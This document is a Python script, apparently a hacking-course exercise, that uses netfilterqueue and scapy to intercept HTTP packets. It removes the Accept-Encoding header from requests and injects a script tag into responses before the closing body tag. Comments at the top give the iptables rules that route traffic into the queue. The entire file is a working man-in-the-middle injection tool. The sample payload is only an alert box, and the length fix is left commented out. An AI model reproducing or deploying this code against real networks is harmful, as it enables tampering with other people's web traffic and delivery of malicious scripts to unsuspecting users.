# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0


import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")

            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")

            injection_code = "<script>alert('test')</script>"

            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code + "</body>")
            length_search = re.search("(?:Content-Length:\s)(\d*)", modified_load)
            length = length_search.group(1)

            new_length = int(length) + len(injection_code)
            # modified_load = modified_load.replace(length, str(new_length))

            if modified_load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, modified_load)
                print("modified load", modified_load)
                packet.set_payload(str(new_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

